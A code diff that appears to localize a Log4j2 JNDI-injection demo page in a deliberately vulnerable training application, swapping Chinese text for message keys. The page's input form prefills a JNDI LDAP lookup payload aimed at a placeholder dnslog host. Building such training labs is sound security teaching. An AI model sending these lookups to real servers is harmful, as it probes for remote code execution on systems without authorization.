@@ -9,12 +9,12 @@
             <div class="layui-col-md12">
                 <fieldset class="layui-elem-field layui-field-title">
                     <legend>
-                        <a style="color: rgb(30 159 255)" class="log4j">组件漏洞 - Log4j2反序列化</a>
+                        <a style="color: rgb(30 159 255)" class="log4j" th:text="#{component.log4j2.title}">Component Vulnerability - Log4j2 Deserialization</a>
                     </legend>
                     <blockquote class="layui-elem-quote layui-quote-nm"
                                 style="font-size: 15px;background-color: #a7deefab;box-shadow: 0 .125rem .25rem rgba(0, 0, 0, .075) !important">
                         <p>
-                        <pre>  log4j是开源的日志记录框架，用于记录程序输入输出日志信息，log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞，成功利用该漏洞可在目标服务器上执行任意代码。</pre>
+                        <pre th:text="#{component.log4j2.intro}">Log4j2 contains a JNDI injection issue.</pre>
                         </p>
                     </blockquote>
                 </fieldset>
@@ -22,7 +22,7 @@
             <div class="layui-col-md12" style="margin-top: 10px">
                 <div class="layui-row layui-col-space15">
                     <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-bug"> 漏洞场景</span></h1>
+                        <h1><span class="iconfont icon-bug" th:text="| #{component.common.vul.title}|"> Vulnerable Scenario</span></h1>
                         <div class="layui-tab layui-tab-brief">
                             <div class="layui-tab-content">
                                 <div class="layui-tab-item layui-show">
@@ -30,14 +30,14 @@
                                         <form class="layui-form" id="vul-log4j2-form" th:action="@{/log4j2/vul}" method="post"
                                               style="display: flex; justify-content: space-between;">
                                             <input type="text" style="width: 450px;" name="payload"
-                                                   value='${jndi:ldap://此处替换为dnslog地址/test}'
+                                                   value='${jndi:ldap://replace-with-dnslog/test}'
                                                    autocomplete="off"
                                                    class="layui-input" id="vul-log4j2-input">
                                             <div style="display: flex; align-items: center;">
                                                 <button class="layui-btn layui-btn-normal"
                                                         style="width: 100px; margin-left: 10px;"
                                                         lay-filter="vul-log4j2-submit" lay-submit="">
-                                                    <span class="iconfont icon-zhihang">Run</span>
+                                                    <span class="iconfont icon-zhihang" th:text="#{button.run}">Run</span>
                                                 </button>
                                             </div>
                                         </form>
@@ -46,13 +46,9 @@
 
                                 <div class="layui-col-md12">
                                     <div class="layui-card">
-                                        <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
+                                        <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i><span th:text="#{common.tips}">tips</span></div>
                                         <div class="layui-card-body layui-text layadmin-text">
-                                            <pre style="color: #28333e;font-size: 15px;">漏洞原理：
-  log4j2在日志输出中，一旦在log字符串中检测到${}，就会调用lookup查询尝试解析其中的字符串，如果未对字符合法性进行严格的限制，攻击者构造恶意的URL地址让其解析，利用 JNDI协议加载的远程恶意脚本，从而造成RCE。
-安全编码规范：
-升级方案：升级Log4j至2.15.0及以上稳定版本
-临时缓解：修改配置文件log4j2.component.propertieslog4j2.formatMsgNoLookups=True</pre>
+                                            <pre style="color: #28333e;font-size: 15px;" th:text="#{component.log4j2.tips}">Vulnerability principle and mitigation.</pre>
                                         </div>
                                     </div>
                                 </div>
@@ -62,82 +58,20 @@
                     </div>
 
                     <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-code"> 缺陷代码</span></h1>
+                        <h1><span class="iconfont icon-code" th:text="| #{common.vulnerableCode}|"> Vulnerable Code</span></h1>
                         <div class="m-auto div-shadow shadow p-3 mb-5 bg-white rounded">
                             <div class="code-editor" id="vulLog4j2"></div>
                         </div>
                     </div>
                 </div>
             </div>
-
-<!--            <div class="layui-col-md12" style="margin-top: 10px">-->
-<!--                <div class="layui-row layui-col-space15">-->
-<!--                    <div class="layui-col-md6">-->
-<!--                        <h1><span class="iconfont icon-anquan"> 安全场景</span></h1>-->
-<!--                        <div class="layui-tab layui-tab-brief">-->
-<!--                            <div class="layui-tab-content">-->
-<!--                                <div class="layui-tab-item layui-show">-->
-<!--                                    <blockquote class="layui-elem-quote main_btn">-->
-<!--                                        <form class="layui-form" id="safe-fastjson-form" th:action="@{/log4j2/vul}" method="post"-->
-<!--                                              style="display: flex; justify-content: space-between;">-->
-<!--                                            <input type="text" style="width: 450px;" name="payload"-->
-<!--                                                   value='${jndi:ldap://此处替换为dnslog地址/test}'-->
-<!--                                                   autocomplete="off"-->
-<!--                                                   class="layui-input" id="safe-log4j2-input">-->
-<!--                                            <div style="display: flex; align-items: center;">-->
-<!--                                                <button class="layui-btn layui-btn-normal"-->
-<!--                                                        style="width: 100px; margin-left: 10px;"-->
-<!--                                                        lay-filter="safe-log4j2-submit" lay-submit="">-->
-<!--                                                    <span class="iconfont icon-zhihang">Run</span>-->
-<!--                                                </button>-->
-<!--                                            </div>-->
-<!--                                        </form>-->
-<!--                                    </blockquote>-->
-<!--                                </div>-->
-
-<!--                                <div class="layui-col-md12">-->
-<!--                                    <div class="layui-card">-->
-<!--                                        <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>-->
-<!--                                        <div class="layui-card-body layui-text layadmin-text">-->
-<!--                                            <pre style="color: #28333e;font-size: 15px;">安全编码规范:-->
-<!--    1、升级版本至1.2.83及以上-->
-<!--    2、禁用AutoType或者是设置特定类白名单进行反序列化-->
-<!--    3、使用SafeMode模式-->
-<!--    4、使用@JSONType注解限制类的反序列化</pre>-->
-<!--                                        </div>-->
-<!--                                    </div>-->
-<!--                                </div>-->
-
-<!--                                <div class="layui-col-md12">-->
-<!--                                    <div class="layui-card">-->
-<!--                                        <div class="layui-card-header"><i class="fa fa-warning icon-output"></i>测试结果-->
-<!--                                        </div>-->
-<!--                                        <div class="layui-card-body layui-text layadmin-text">-->
-<!--                                            <pre id="safe-log4j2-result" style="color: red;font-size: 15px;"></pre>-->
-<!--                                        </div>-->
-<!--                                    </div>-->
-<!--                                </div>-->
-
-<!--                            </div>-->
-<!--                        </div>-->
-<!--                    </div>-->
-
-<!--                    <div class="layui-col-md6">-->
-<!--                        <h1><span class="iconfont icon-code"> 安全代码</span></h1>-->
-<!--                        <div class="m-auto div-shadow shadow p-3 mb-5 bg-white rounded">-->
-<!--                            <div class="code-editor" id="safeLog4j2"></div>-->
-<!--                        </div>-->
-<!--                    </div>-->
-<!--                </div>-->
-<!--            </div>-->
-
         </div>
     </div>
 </div>
 </div>
 
 <div th:replace="~{common/common::script}"></div>
-<script type="text/javascript">
+<script type="text/javascript" th:inline="javascript">
     document.addEventListener("DOMContentLoaded", function () {
 
         layui.use(['layer', 'miniTab', 'common', 'form'], function () {
@@ -148,7 +82,13 @@
                 form = layui.form;
 
             miniTab.listen();
-            layer.msg("组件漏洞 - Log4j2反序列化");
+            layer.msg(/*[[#{component.log4j2.title}]]*/ "Component Vulnerability - Log4j2 Deserialization");
+            var isEnglish = /*[[${#locale.language == 'en'}]]*/ false;
+            var codeSnippets = window.componentCodeSnippets || {};
+
+            function codeSnippet(enName, zhName) {
+                return codeSnippets[isEnglish ? enName : zhName] || codeSnippets[enName] || "";
+            }
 
             var cmConfig = {
                 lineNumbers: true,
@@ -173,11 +113,11 @@
             };
 
             CodeMirror(document.getElementById("vulLog4j2"), Object.assign({}, cmConfig, {
-                value: vulLog4j2
+                value: codeSnippet("vulLog4j2", "vulLog4j2Zh")
             }));
             if (document.getElementById("safeLog4j2")) {
                 CodeMirror(document.getElementById("safeLog4j2"), Object.assign({}, cmConfigSafe, {
-                    value: safeLog4j2
+                    value: codeSnippet("safeLog4j2", "safeLog4j2Zh")
                 }));
             }
 
@@ -185,7 +125,7 @@
 
         $('.log4j').hover(function () {
             $(this).css('cursor', 'pointer');
-            layer.tips('攻击流程图', this, {
+            layer.tips(/*[[#{component.common.attackFlow}]]*/ 'Attack Flow', this, {
                 tips: [1, '#0051ff'],
                 time: 2000
             });
@@ -196,7 +136,7 @@
                 type: 1,
                 title: false,
                 closeBtn: 1,
-                area: ['1116px', '572px'], // 宽高可以根据需要调整
+                area: ['1116px', '572px'],
                 shadeClose: true,
                 content: '<div style="text-align: center;"><img src="/images/vul/components/log4j.png" style="width: 100%; height: 50%;"></div>'
             });
